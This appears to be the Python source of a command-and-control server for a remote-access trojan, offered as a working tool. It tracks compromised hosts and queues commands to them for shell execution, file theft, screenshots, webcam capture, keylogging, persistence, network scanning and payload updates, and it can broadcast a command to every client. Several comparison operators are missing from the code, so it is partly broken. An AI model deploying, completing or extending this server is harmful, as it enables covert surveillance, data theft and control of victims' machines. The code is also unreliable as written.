#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
c2_server.py - Advanced Command & Control Server
"""

import os
import sys
import json
import socket
import ssl
import threading
import asyncio
import select
import struct
import hashlib
import base64
import time
import random
import string
from typing import Dict, List, Optional, Tuple, Any, Union, Callable
from datetime import datetime, timedelta
from pathlib import Path
from enum import Enum
from collections import defaultdict

# Import encryption and logging
from ..security.encryption_manager import get_encryption_manager
from ..utils.logger import get_logger
from ..security.audit_log import get_audit_log_manager, AuditEventType, AuditSeverity

logger = get_logger()
audit_log = get_audit_log_manager()

class ClientStatus(Enum):
    """Client connection status"""
    CONNECTED = "connected"
    ACTIVE = "active"
    IDLE = "idle"
    DISCONNECTED = "disconnected"
    COMPROMISED = "compromised"

class CommandType(Enum):
    """Command types"""
    SHELL = "shell"
    FILE_UPLOAD = "file_upload"
    FILE_DOWNLOAD = "file_download"
    SCREENSHOT = "screenshot"
    WEBCAM = "webcam"
    KEYLOGGER = "keylogger"
    SYSTEM_INFO = "system_info"
    PERSISTENCE = "persistence"
    NETWORK_SCAN = "network_scan"
    PORT_SCAN = "port_scan"
    UPDATE = "update"
    UNINSTALL = "uninstall"
    CUSTOM = "custom"

class C2Protocol(Enum):
    """C2 Protocols"""
    HTTP = "http"
    HTTPS = "https"
    DNS = "dns"
    ICMP = "icmp"
    TCP = "tcp"
    UDP = "udp"
    WEBSOCKET = "websocket"

class Client:
    """C2 Client representation"""
    
    def __init__(self, 
                 client_id: str,
                 socket: socket.socket,
                 address: Tuple[str, int],
                 protocol: str = "tcp"):
        self.client_id = client_id
        self.socket = socket
        self.address = address
        self.protocol = protocol
        
        # Client info
        self.system_info = {}
        self.hostname = "unknown"
        self.username = "unknown"
        self.os = "unknown"
        self.architecture = "unknown"
        self.privileges = "user"
        
        # Connection info
        self.connected_at = datetime.now()
        self.last_seen = datetime.now()
        self.status = ClientStatus.CONNECTED
        self.ping_time = 0
        self.bytes_sent = 0
        self.bytes_received = 0
        
        # Command queue
        self.command_queue = []
        self.current_command = None
        
        # Encryption
        self.encryption_key = None
        self.encryption_enabled = False
        
        # Heartbeat
        self.heartbeat_interval = 30
        self.last_heartbeat = datetime.now()
        
        # Metadata
        self.tags = []
        self.metadata = {}
        
        logger.info(f"New client connected: {client_id} from {address}", module="c2_server")
    
    def update_info(self, info: Dict[str, Any]):
        """Update client information"""
        self.system_info = info.get('system_info', self.system_info)
        self.hostname = info.get('hostname', self.hostname)
        self.username = info.get('username', self.username)
        self.os = info.get('os', self.os)
        self.architecture = info.get('architecture', self.architecture)
        self.privileges = info.get('privileges', self.privileges)
        
        if 'tags' in info:
            self.tags = info['tags']
        
        self.last_seen = datetime.now()
    
    def add_command(self, command: Dict[str, Any]):
        """Add command to queue"""
        self.command_queue.append(command)
    
    def get_next_command(self) -> Optional[Dict[str, Any]]:
        """Get next command from queue"""
        if self.command_queue:
            self.current_command = self.command_queue.pop(0)
            return self.current_command
        return None
    
    def complete_command(self, result: Dict[str, Any]):
        """Complete current command"""
        if self.current_command:
            self.current_command['result'] = result
            self.current_command['completed_at'] = datetime.now().isoformat()
            self.current_command = None
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            'client_id': self.client_id,
            'address': self.address,
            'hostname': self.hostname,
            'username': self.username,
            'os': self.os,
            'architecture': self.architecture,
            'privileges': self.privileges,
            'connected_at': self.connected_at.isoformat(),
            'last_seen': self.last_seen.isoformat(),
            'status': self.status.value,
            'ping_time': self.ping_time,
            'bytes_sent': self.bytes_sent,
            'bytes_received': self.bytes_received,
            'queue_length': len(self.command_queue),
            'tags': self.tags,
            'metadata': self.metadata
        }
    
    def is_alive(self) -> bool:
        """Check if client is alive"""
        time_since_seen = (datetime.now() - self.last_seen).total_seconds()
        return time_since_seen self.heartbeat_interval * 3
    
    def disconnect(self):
        """Disconnect client"""
        try:
            self.socket.close()
            self.status = ClientStatus.DISCONNECTED
            logger.info(f"Client disconnected: {self.client_id}", module="c2_server")
        except:
            pass

class C2Server:
    """Advanced Command & Control Server"""
    
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        
        # Server configuration
        self.host = self.config.get('host', '0.0.0.0')
        self.port = self.config.get('port', 4444)
        self.backlog = self.config.get('backlog', 100)
        self.max_clients = self.config.get('max_clients', 1000)
        
        # Protocol configuration
        self.protocol = self.config.get('protocol', 'tcp')
        self.use_ssl = self.config.get('use_ssl', False)
        self.ssl_cert = self.config.get('ssl_cert')
        self.ssl_key = self.config.get('ssl_key')
        
        # Encryption
        self.encryption_manager = get_encryption_manager()
        self.server_key_id = None
        self._setup_encryption()
        
        # Client management
        self.clients = {}  # client_id -> Client
        self.client_lock = threading.Lock()
        
        # Command handlers
        self.command_handlers = {}
        self._register_default_handlers()
        
        # Server socket
        self.server_socket = None
        self.running = False
        self.server_thread = None
        
        # Statistics
        self.stats = {
            'total_connections': 0,
            'active_connections': 0,
            'total_commands': 0,
            'successful_commands': 0,
            'failed_commands': 0,
            'bytes_transferred': 0,
            'start_time': datetime.now()
        }
        
        # Callbacks
        self.on_client_connect = None
        self.on_client_disconnect = None
        self.on_command_complete = None
        
        logger.info(f"C2 Server initialized on {self.host}:{self.port}", module="c2_server")
    
    def _setup_encryption(self):
        """Setup server encryption"""
        try:
            # Generate server key pair
            private_id, public_id = self.encryption_manager.generate_asymmetric_keypair(
                key_type='c2_server',
                key_size=2048,
                metadata={'purpose': 'c2_communication'}
            )
            
            if private_id and public_id:
                self.server_key_id = private_id
                logger.info(f"C2 server encryption keys generated", module="c2_server")
            else:
                logger.error("Failed to generate encryption keys", module="c2_server")
                
        except Exception as e:
            logger.error(f"Encryption setup error: {e}", module="c2_server")
    
    def _register_default_handlers(self):
        """Register default command handlers"""
        self.command_handlers = {
            CommandType.SHELL.value: self._handle_shell_command,
            CommandType.FILE_UPLOAD.value: self._handle_file_upload,
            CommandType.FILE_DOWNLOAD.value: self._handle_file_download,
            CommandType.SCREENSHOT.value: self._handle_screenshot,
            CommandType.WEBCAM.value: self._handle_webcam,
            CommandType.KEYLOGGER.value: self._handle_keylogger,
            CommandType.SYSTEM_INFO.value: self._handle_system_info,
            CommandType.PERSISTENCE.value: self._handle_persistence,
            CommandType.NETWORK_SCAN.value: self._handle_network_scan,
            CommandType.PORT_SCAN.value: self._handle_port_scan,
            CommandType.UPDATE.value: self._handle_update,
            CommandType.UNINSTALL.value: self._handle_uninstall
        }
    
    def start(self) -> bool:
        """Start C2 server"""
        try:
            # Create socket
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Bind and listen
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(self.backlog)
            self.server_socket.setblocking(False)
            
            # SSL wrapping if enabled
            if self.use_ssl and self.ssl_cert and self.ssl_key:
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                context.load_cert_chain(certfile=self.ssl_cert, keyfile=self.ssl_key)
                self.server_socket = context.wrap_socket(self.server_socket, server_side=True)
            
            self.running = True
            
            # Start server thread
            self.server_thread = threading.Thread(target=self._server_loop, daemon=True)
            self.server_thread.start()
            
            # Start client management thread
            management_thread = threading.Thread(target=self._management_loop, daemon=True)
            management_thread.start()
            
            logger.info(f"C2 Server started on {self.host}:{self.port}", module="c2_server")
            
            # Log audit event
            audit_log.log_event(
                event_type=AuditEventType.SYSTEM_CHANGE.value,
                severity=AuditSeverity.INFO.value,
                user='system',
                source_ip=self.host,
                description=f"C2 Server started on port {self.port}",
                details={
                    'host': self.host,
                    'port': self.port,
                    'protocol': self.protocol,
                    'ssl': self.use_ssl
                },
                resource='c2_server',
                action='start'
            )
            
            return True
            
        except Exception as e:
            logger.error(f"Failed to start C2 server: {e}", module="c2_server")
            return False
    
    def stop(self):
        """Stop C2 server"""
        self.running = False
        
        # Disconnect all clients
        with self.client_lock:
            for client_id, client in list(self.clients.items()):
                client.disconnect()
            self.clients.clear()
        
        # Close server socket
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        
        logger.info("C2 Server stopped", module="c2_server")
    
    def _server_loop(self):
        """Main server loop"""
        try:
            # Use select for non-blocking I/O
            inputs = [self.server_socket]
            
            while self.running:
                try:
                    readable, _, exceptional = select.select(inputs, [], inputs, 1.0)
                    
                    for sock in readable:
                        if sock is self.server_socket:
                            # New connection
                            self._accept_connection()
                    
                    for sock in exceptional:
                        # Handle exceptional conditions
                        if sock is self.server_socket:
                            logger.error("Server socket exception", module="c2_server")
                            self.running = False
                        else:
                            # Client socket exception
                            self._handle_client_exception(sock)
                    
                    # Process client communications
                    self._process_clients()
                    
                except Exception as e:
                    logger.error(f"Server loop error: {e}", module="c2_server")
                    time.sleep(1)
                    
        except Exception as e:
            logger.error(f"Server loop fatal error: {e}", module="c2_server")
    
    def _accept_connection(self):
        """Accept new client connection"""
        try:
            client_socket, address = self.server_socket.accept()
            client_socket.setblocking(False)
            
            # Generate client ID
            client_id = self._generate_client_id(address)
            
            # Create client object
            client = Client(
                client_id=client_id,
                socket=client_socket,
                address=address,
                protocol=self.protocol
            )
            
            # Add to clients
            with self.client_lock:
                self.clients[client_id] = client
            
            # Update stats
            self.stats['total_connections'] += 1
            self.stats['active_connections'] = len(self.clients)
            
            # Send initial handshake
            self._send_handshake(client)
            
            # Callback
            if self.on_client_connect:
                self.on_client_connect(client)
            
            logger.info(f"New client accepted: {client_id} from {address}", module="c2_server")
            
            # Log audit event
            audit_log.log_event(
                event_type=AuditEventType.NETWORK_ACCESS.value,
                severity=AuditSeverity.INFO.value,
                user='system',
                source_ip=address[0],
                description=f"New C2 client connected: {client_id}",
                details={
                    'client_id': client_id,
                    'address': address,
                    'protocol': self.protocol
                },
                resource='c2_server',
                action='client_connect'
            )
            
        except Exception as e:
            logger.error(f"Accept connection error: {e}", module="c2_server")
    
    def _generate_client_id(self, address: Tuple[str, int]) -> str:
        """Generate unique client ID"""
        timestamp = int(time.time() * 1000)
        random_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        ip_hash = hashlib.md5(address[0].encode()).hexdigest()[:8]
        return f"CLIENT_{timestamp}_{ip_hash}_{random_part}"
    
    def _send_handshake(self, client: Client):
        """Send handshake to client"""
        try:
            handshake = {
                'type': 'handshake',
                'server_id': 'C2_SERVER',
                'timestamp': datetime.now().isoformat(),
                'encryption_enabled': self.server_key_id is not None,
                'heartbeat_interval': 30,
                'max_packet_size': 65536
            }
            
            if self.server_key_id:
                # Include public key for encryption
                public_key_record = self.encryption_manager.get_key(self.server_key_id.replace('_private', '_public'), decrypt=False)
                if public_key_record and 'public_key' in public_key_record:
                    handshake['public_key'] = public_key_record['public_key']
            
            self._send_to_client(client, handshake)
            
        except Exception as e:
            logger.error(f"Handshake error: {e}", module="c2_server")
    
    def _process_clients(self):
        """Process communications from all clients"""
        with self.client_lock:
            for client_id, client in list(self.clients.items()):
                try:
                    # Check for incoming data
                    ready = select.select([client.socket], [], [], 0.1)[0]
                    
                    if ready:
                        data = self._receive_from_client(client)
                        
                        if data:
                            self._handle_client_message(client, data)
                        else:
                            # Connection closed
                            self._disconnect_client(client_id)
                            continue
                    
                    # Send queued commands
                    self._send_queued_commands(client)
                    
                    # Check heartbeat
                    self._check_heartbeat(client)
                    
                except Exception as e:
                    logger.error(f"Client processing error {client_id}: {e}", module="c2_server")
                    self._disconnect_client(client_id)
    
    def _receive_from_client(self, client: Client) -> Optional[Dict[str, Any]]:
        """Receive data from client"""
        try:
            # Read packet header (4 bytes for length)
            header = client.socket.recv(4)
            if not header:
                return None
            
            packet_length = struct.unpack('!I', header)[0]
            
            if packet_length > 10 * 1024 * 1024:  # 10MB limit
                logger.warning(f"Packet too large from {client.client_id}: {packet_length}", 
                             module="c2_server")
                return None
            
            # Read packet data
            data = b''
            while len(data)packet_length:
                chunk = client.socket.recv(min(4096, packet_length - len(data)))
                if not chunk:
                    return None
                data += chunk
            
            client.bytes_received += len(data) + 4
            
            # Decrypt if needed
            if client.encryption_enabled and client.encryption_key:
                decrypted = self.encryption_manager.decrypt_data(data, client.encryption_key)
                if decrypted:
                    data = decrypted
            
            # Parse JSON
            try:
                message = json.loads(data.decode('utf-8'))
                return message
            except json.JSONDecodeError:
                logger.error(f"Invalid JSON from {client.client_id}", module="c2_server")
                return None
                
        except socket.error as e:
            if e.errno != socket.errno.EWOULDBLOCK:
                logger.debug(f"Socket error from {client.client_id}: {e}", module="c2_server")
            return None
        except Exception as e:
            logger.error(f"Receive error from {client.client_id}: {e}", module="c2_server")
            return None
    
    def _send_to_client(self, client: Client, message: Dict[str, Any]) -> bool:
        """Send data to client"""
        try:
            # Convert to JSON
            data = json.dumps(message, default=str).encode('utf-8')
            
            # Encrypt if needed
            if client.encryption_enabled and client.encryption_key:
                encrypted = self.encryption_manager.encrypt_data(data, client.encryption_key)
                if encrypted:
                    data = encrypted
            
            # Send packet header (length)
            header = struct.pack('!I', len(data))
            client.socket.sendall(header)
            
            # Send packet data
            client.socket.sendall(data)
            
            client.bytes_sent += len(data) + 4
            self.stats['bytes_transferred'] += len(data) + 4
            
            return True
            
        except Exception as e:
            logger.error(f"Send error to {client.client_id}: {e}", module="c2_server")
            return False
    
    def _handle_client_message(self, client: Client, message: Dict[str, Any]):
        """Handle message from client"""
        try:
            msg_type = message.get('type')
            
            if msg_type == 'handshake_response':
                self._handle_handshake_response(client, message)
            elif msg_type == 'heartbeat':
                self._handle_heartbeat(client, message)
            elif msg_type == 'system_info':
                self._handle_system_info_update(client, message)
            elif msg_type == 'command_result':
                self._handle_command_result(client, message)
            elif msg_type == 'file_chunk':
                self._handle_file_chunk(client, message)
            elif msg_type == 'error':
                self._handle_error(client, message)
            else:
                logger.warning(f"Unknown message type from {client.client_id}: {msg_type}", 
                             module="c2_server")
                
        except Exception as e:
            logger.error(f"Message handling error from {client.client_id}: {e}", 
                       module="c2_server")
    
    def _handle_handshake_response(self, client: Client, message: Dict[str, Any]):
        """Handle handshake response"""
        try:
            client.encryption_enabled = message.get('encryption_enabled', False)
            
            if client.encryption_enabled:
                # Client sent encrypted session key
                encrypted_session_key = base64.b64decode(message.get('session_key', ''))
                
                if encrypted_session_key and self.server_key_id:
                    # Decrypt session key with server private key
                    session_key = self.encryption_manager.decrypt_data(
                        encrypted_session_key,
                        self.server_key_id
                    )
                    
                    if session_key:
                        # Store session key for this client
                        client.encryption_key = self.encryption_manager.generate_symmetric_key(
                            key_type='session',
                            key_size=32,
                            metadata={'client_id': client.client_id}
                        )
            
            client.status = ClientStatus.ACTIVE
            client.update_info(message.get('info', {}))
            
            logger.info(f"Handshake complete with {client.client_id}", module="c2_server")
            
        except Exception as e:
            logger.error(f"Handshake response error: {e}", module="c2_server")
    
    def _handle_heartbeat(self, client: Client, message: Dict[str, Any]):
        """Handle heartbeat"""
        client.last_heartbeat = datetime.now()
        client.ping_time = message.get('ping_time', 0)
        client.status = ClientStatus.ACTIVE
        
        # Update client info if provided
        if 'info' in message:
            client.update_info(message['info'])
    
    def _handle_system_info_update(self, client: Client, message: Dict[str, Any]):
        """Handle system info update"""
        client.update_info(message)
        logger.debug(f"System info updated for {client.client_id}", module="c2_server")
    
    def _handle_command_result(self, client: Client, message: Dict[str, Any]):
        """Handle command result"""
        try:
            command_id = message.get('command_id')
            success = message.get('success', False)
            output = message.get('output')
            error = message.get('error')
            
            # Complete command
            client.complete_command({
                'success': success,
                'output': output,
                'error': error,
                'received_at': datetime.now().isoformat()
            })
            
            # Update stats
            self.stats['total_commands'] += 1
            if success:
                self.stats['successful_commands'] += 1
            else:
                self.stats['failed_commands'] += 1
            
            # Callback
            if self.on_command_complete:
                self.on_command_complete(client, command_id, success, output, error)
            
            logger.info(f"Command {command_id} completed by {client.client_id}: {'Success' if success else 'Failed'}", 
                       module="c2_server")
            
            # Log audit event
            audit_log.log_event(
                event_type=AuditEventType.COMMAND_EXECUTION.value,
                severity=AuditSeverity.INFO.value if success else AuditSeverity.ERROR.value,
                user=client.username,
                source_ip=client.address[0],
                description=f"Command executed by {client.client_id}",
                details={
                    'client_id': client.client_id,
                    'command_id': command_id,
                    'success': success,
                    'output_length': len(str(output)) if output else 0,
                    'error': error
                },
                resource='c2_server',
                action='command_execution',
                outcome='success' if success else 'failure'
            )
            
        except Exception as e:
            logger.error(f"Command result handling error: {e}", module="c2_server")
    
    def _handle_file_chunk(self, client: Client, message: Dict[str, Any]):
        """Handle file chunk"""
        try:
            file_id = message.get('file_id')
            chunk_index = message.get('chunk_index')
            total_chunks = message.get('total_chunks')
            data = base64.b64decode(message.get('data', ''))
            
            # Save chunk to file
            upload_dir = self.config.get('upload_dir', 'uploads')
            os.makedirs(upload_dir, exist_ok=True)
            
            file_path = os.path.join(upload_dir, f"{file_id}.part{chunk_index}")
            with open(file_path, 'wb') as f:
                f.write(data)
            
            logger.debug(f"Received file chunk {chunk_index}/{total_chunks} from {client.client_id}", 
                        module="c2_server")
            
            # If this is the last chunk, assemble file
            if chunk_index == total_chunks - 1:
                self._assemble_file(file_id, total_chunks, client)
                
        except Exception as e:
            logger.error(f"File chunk handling error: {e}", module="c2_server")
    
    def _assemble_file(self, file_id: str, total_chunks: int, client: Client):
        """Assemble file from chunks"""
        try:
            upload_dir = self.config.get('upload_dir', 'uploads')
            output_path = os.path.join(upload_dir, file_id)
            
            with open(output_path, 'wb') as outfile:
                for i in range(total_chunks):
                    chunk_path = os.path.join(upload_dir, f"{file_id}.part{i}")
                    if os.path.exists(chunk_path):
                        with open(chunk_path, 'rb') as infile:
                            outfile.write(infile.read())
                        os.remove(chunk_path)
            
            logger.info(f"File assembled: {output_path} from {client.client_id}", module="c2_server")
            
            # Notify client
            self._send_to_client(client, {
                'type': 'file_upload_complete',
                'file_id': file_id,
                'path': output_path
            })
            
        except Exception as e:
            logger.error(f"File assembly error: {e}", module="c2_server")
    
    def _handle_error(self, client: Client, message: Dict[str, Any]):
        """Handle error message"""
        error = message.get('error', 'Unknown error')
        logger.error(f"Error from {client.client_id}: {error}", module="c2_server")
    
    def _send_queued_commands(self, client: Client):
        """Send queued commands to client"""
        try:
            if client.status != ClientStatus.ACTIVE:
                return
            
            # Get next command
            command = client.get_next_command()
            if not command:
                return
            
            # Send command
            self._send_to_client(client, {
                'type': 'command',
                'command_id': command.get('id'),
                'command_type': command.get('type'),
                'command_data': command.get('data'),
                'timestamp': datetime.now().isoformat()
            })
            
            logger.info(f"Sent command {command.get('id')} to {client.client_id}", 
                       module="c2_server")
            
        except Exception as e:
            logger.error(f"Send command error: {e}", module="c2_server")
    
    def _check_heartbeat(self, client: Client):
        """Check client heartbeat"""
        time_since_heartbeat = (datetime.now() - client.last_heartbeat).total_seconds()
        
        if time_since_heartbeat client.heartbeat_interval * 3:
            # Client is idle
            client.status = ClientStatus.IDLE
        elif time_since_heartbeat client.heartbeat_interval * 10:
            # Client is dead
            logger.warning(f"Client {client.client_id} heartbeat timeout", module="c2_server")
            self._disconnect_client(client.client_id)
    
    def _handle_client_exception(self, sock: socket.socket):
        """Handle client socket exception"""
        with self.client_lock:
            for client_id, client in list(self.clients.items()):
                if client.socket is sock:
                    self._disconnect_client(client_id)
                    break
    
    def _disconnect_client(self, client_id: str):
        """Disconnect client"""
        with self.client_lock:
            if client_id in self.clients:
                client = self.clients[client_id]
                client.disconnect()
                del self.clients[client_id]
                
                self.stats['active_connections'] = len(self.clients)
                
                # Callback
                if self.on_client_disconnect:
                    self.on_client_disconnect(client)
                
                logger.info(f"Client disconnected: {client_id}", module="c2_server")
                
                # Log audit event
                audit_log.log_event(
                    event_type=AuditEventType.NETWORK_ACCESS.value,
                    severity=AuditSeverity.INFO.value,
                    user='system',
                    source_ip=client.address[0],
                    description=f"C2 client disconnected: {client_id}",
                    details={
                        'client_id': client_id,
                        'address': client.address,
                        'connection_duration': (datetime.now() - client.connected_at).total_seconds()
                    },
                    resource='c2_server',
                    action='client_disconnect'
                )
    
    def _management_loop(self):
        """Management and maintenance loop"""
        while self.running:
            try:
                # Cleanup dead clients
                self._cleanup_dead_clients()
                
                # Update statistics
                self._update_statistics()
                
                # Backup if configured
                if self.config.get('auto_backup', False):
                    self._backup_data()
                
                time.sleep(60)  # Run every minute
                
            except Exception as e:
                logger.error(f"Management loop error: {e}", module="c2_server")
                time.sleep(10)
    
    def _cleanup_dead_clients(self):
        """Cleanup dead clients"""
        with self.client_lock:
            dead_clients = []
            
            for client_id, client in self.clients.items():
                if not client.is_alive():
                    dead_clients.append(client_id)
            
            for client_id in dead_clients:
                logger.warning(f"Cleaning up dead client: {client_id}", module="c2_server")
                self._disconnect_client(client_id)
    
    def _update_statistics(self):
        """Update server statistics"""
        # Statistics are updated in real-time
        pass
    
    def _backup_data(self):
        """Backup server data"""
        try:
            backup_dir = self.config.get('backup_dir', 'backups')
            os.makedirs(backup_dir, exist_ok=True)
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            backup_file = os.path.join(backup_dir, f"c2_backup_{timestamp}.json")
            
            backup_data = {
                'timestamp': datetime.now().isoformat(),
                'clients': [client.to_dict() for client in self.clients.values()],
                'stats': self.stats,
                'config': self.config
            }
            
            with open(backup_file, 'w') as f:
                json.dump(backup_data, f, indent=2, default=str)
            
            logger.debug(f"Backup created: {backup_file}", module="c2_server")
            
        except Exception as e:
            logger.error(f"Backup error: {e}", module="c2_server")
    
    # Command execution methods
    def execute_command(self, 
                       client_id: str, 
                       command_type: str, 
                       command_data: Dict[str, Any] = None,
                       command_id: str = None) -> Optional[str]:
        """Execute command on client"""
        try:
            with self.client_lock:
                if client_id not in self.clients:
                    logger.error(f"Client not found: {client_id}", module="c2_server")
                    return None
                
                client = self.clients[client_id]
                
                if client.status not in [ClientStatus.ACTIVE, ClientStatus.IDLE]:
                    logger.error(f"Client not active: {client_id}", module="c2_server")
                    return None
                
                # Generate command ID if not provided
                if not command_id:
                    command_id = f"CMD_{int(time.time() * 1000)}_{random.randint(1000, 9999)}"
                
                # Create command
                command = {
                    'id': command_id,
                    'type': command_type,
                    'data': command_data or {},
                    'created_at': datetime.now().isoformat(),
                    'status': 'queued'
                }
                
                # Add to client queue
                client.add_command(command)
                
                logger.info(f"Command queued for {client_id}: {command_id} ({command_type})", 
                           module="c2_server")
                
                return command_id
                
        except Exception as e:
            logger.error(f"Execute command error: {e}", module="c2_server")
            return None
    
    def execute_command_all(self, 
                           command_type: str, 
                           command_data: Dict[str, Any] = None,
                           filter_func: Callable[[Client], bool] = None) -> List[str]:
        """Execute command on all matching clients"""
        command_ids = []
        
        with self.client_lock:
            for client_id, client in self.clients.items():
                if client.status in [ClientStatus.ACTIVE, ClientStatus.IDLE]:
                    if filter_func is None or filter_func(client):
                        cmd_id = self.execute_command(client_id, command_type, command_data)
                        if cmd_id:
                            command_ids.append((client_id, cmd_id))
        
        return command_ids
    
    # Command handlers (simplified implementations)
    def _handle_shell_command(self, client: Client, command_data: Dict[str, Any]) -> Dict[str, Any]:
        """Handle shell command"""
        # This would be implemented on client side
        return {'type': 'shell', 'command': command_data.get('command')}
    
    def _handle_file_upload(self, client: Client, command_data: Dict[str, Any]) -> Dict[str, Any]:
        """Handle file upload command"""
        return {
            'type': 'file_upload',
            'source_path': command_data.get('source_path'),
            'destination_path': command_data.get('destination_path'),
            'chunk_size': command_data.get('chunk_size', 65536)
        }
    
    def _handle_file_download(self, client: Client, command_data: Dict[str, Any]) -> Dict[str, Any]:
        """Handle file download command"""
        return {
            'type': 'file_download',
            'source_path': command_data.get('source_path'),
            'destination_path': command_data.get('destination_path')
        }
    
    def _handle_screenshot(self, client: Client, command_data: Dict[str, Any]) -> Dict[str, Any]:
        """Handle screenshot command"""
        return {'type': 'screenshot', 'quality': command_data.get('quality', 85)}
    
    def _handle_webcam(self, client: Client, command_data: Dict[str, Any]) -> Dict[str, Any]:
        """Handle webcam command"""
        return {'type': 'webcam', 'duration': command_data.get('duration', 5)}
    
    def _handle_keylogger(self, client: Client, command_data: Dict[str, Any]) -> Dict[str, Any]:
        """Handle keylogger command"""
        return {
            'type': 'keylogger',
            'action': command_data.get('action', 'start'),
            'duration': command_data.get('duration', 3600)
        }
    
    def _handle_system_info(self, client: Client, command_data: Dict[str, Any]) -> Dict[str, Any]:
        """Handle system info command"""
        return {'type': 'system_info'}
    
    def _handle_persistence(self, client: Client, command_data: Dict[str, Any]) -> Dict[str, Any]:
        """Handle persistence command"""
        return {
            'type': 'persistence',
            'method': command_data.get('method', 'registry'),
            'enabled': command_data.get('enabled', True)
        }
    
    def _handle_network_scan(self, client: Client, command_data: Dict[str, Any]) -> Dict[str, Any]:
        """Handle network scan command"""
        return {
            'type': 'network_scan',
            'target': command_data.get('target', 'local'),
            'ports': command_data.get('ports', '1-1024')
        }
    
    def _handle_port_scan(self, client: Client, command_data: Dict[str, Any]) -> Dict[str, Any]:
        """Handle port scan command"""
        return {
            'type': 'port_scan',
            'target': command_data.get('target'),
            'ports': command_data.get('ports', '1-1024'),
            'timeout': command_data.get('timeout', 1.0)
        }
    
    def _handle_update(self, client: Client, command_data: Dict[str, Any]) -> Dict[str, Any]:
        """Handle update command"""
        return {
            'type': 'update',
            'url': command_data.get('url'),
            'version': command_data.get('version')
        }
    
    def _handle_uninstall(self, client: Client, command_data: Dict[str, Any]) -> Dict[str, Any]:
        """Handle uninstall command"""
        return {
            'type': 'uninstall',
            'cleanup': command_data.get('cleanup', True)
        }
    
    # Client management methods
    def get_clients(self, 
                   status: str = None, 
                   tags: List[str] = None) -> List[Dict[str, Any]]:
        """Get clients with optional filtering"""
        with self.client_lock:
            clients = []
            
            for client in self.clients.values():
                if status and client.status.value != status:
                    continue
                
                if tags and not any(tag in client.tags for tag in tags):
                    continue
                
                clients.append(client.to_dict())
            
            return clients
    
    def get_client(self, client_id: str) -> Optional[Dict[str, Any]]:
        """Get specific client"""
        with self.client_lock:
            if client_id in self.clients:
                return self.clients[client_id].to_dict()
            return None
    
    def disconnect_client(self, client_id: str) -> bool:
        """Disconnect specific client"""
        with self.client_lock:
            if client_id in self.clients:
                self._disconnect_client(client_id)
                return True
            return False
    
    def tag_client(self, client_id: str, tags: List[str]) -> bool:
        """Tag client"""
        with self.client_lock:
            if client_id in self.clients:
                client = self.clients[client_id]
                client.tags = list(set(client.tags + tags))
                return True
            return False
    
    def untag_client(self, client_id: str, tags: List[str]) -> bool:
        """Remove tags from client"""
        with self.client_lock:
            if client_id in self.clients:
                client = self.clients[client_id]
                client.tags = [tag for tag in client.tags if tag not in tags]
                return True
            return False
    
    # Statistics methods
    def get_statistics(self) -> Dict[str, Any]:
        """Get server statistics"""
        uptime = (datetime.now() - self.stats['start_time']).total_seconds()
        
        return {
            **self.stats,
            'uptime_seconds': uptime,
            'uptime_human': str(timedelta(seconds=int(uptime))),
            'client_count': len(self.clients),
            'command_success_rate': (self.stats['successful_commands'] / self.stats['total_commands'] * 100 
                                   if self.stats['total_commands'] > 0 else 0),
            'bytes_per_second': self.stats['bytes_transferred'] / uptime if uptime > 0 else 0
        }
    
    def get_detailed_statistics(self) -> Dict[str, Any]:
        """Get detailed statistics"""
        stats = self.get_statistics()
        
        # Add client statistics
        client_stats = defaultdict(int)
        with self.client_lock:
            for client in self.clients.values():
                client_stats[client.os] += 1
                client_stats[client.privileges] += 1
        
        stats['client_os_distribution'] = dict(client_stats)
        
        # Add command type distribution (would need tracking)
        stats['command_type_distribution'] = {}
        
        return stats

# Global instance
_c2_server = None

def get_c2_server(config: Dict = None) -> C2Server:
    """Get or create C2 server instance"""
    global _c2_server
    
    if _c2_server is None:
        _c2_server = C2Server(config)
    
    return _c2_server

if __name__ == "__main__":
    # Test C2 server
    config = {
        'host': '127.0.0.1',
        'port': 4444,
        'protocol': 'tcp',
        'use_ssl': False,
        'max_clients': 100,
        'upload_dir': 'uploads',
        'backup_dir': 'backups',
        'auto_backup': True
    }
    
    server = get_c2_server(config)
    
    # Set up callbacks
    def on_client_connect(client):
        print(f"📡 Client connected: {client.client_id} ({client.hostname})")
    
    def on_client_disconnect(client):
        print(f"📡 Client disconnected: {client.client_id}")
    
    def on_command_complete(client, command_id, success, output, error):
        print(f"✅ Command {command_id} completed: {'Success' if success else 'Failed'}")
    
    server.on_client_connect = on_client_connect
    server.on_client_disconnect = on_client_disconnect
    server.on_command_complete = on_command_complete
    
    print("Starting C2 server...")
    if server.start():
        print(f"✅ C2 Server started on {config['host']}:{config['port']}")
        print("Press Ctrl+C to stop")
        
        try:
            # Keep server running
            while True:
                time.sleep(1)
                
                # Print status every 10 seconds
                if int(time.time()) % 10 == 0:
                    stats = server.get_statistics()
                    print(f"\n📊 Server Status:")
                    print(f"  Clients: {stats['active_connections']}/{stats['total_connections']}")
                    print(f"  Commands: {stats['total_commands']} ({stats['successful_commands']} successful)")
                    print(f"  Uptime: {stats['uptime_human']}")
                    print(f"  Data transferred: {stats['bytes_transferred'] / 1024 / 1024:.2f} MB")
                    
        except KeyboardInterrupt:
            print("\nStopping server...")
            server.stop()
            print("✅ Server stopped")
    else:
        print("❌ Failed to start server")
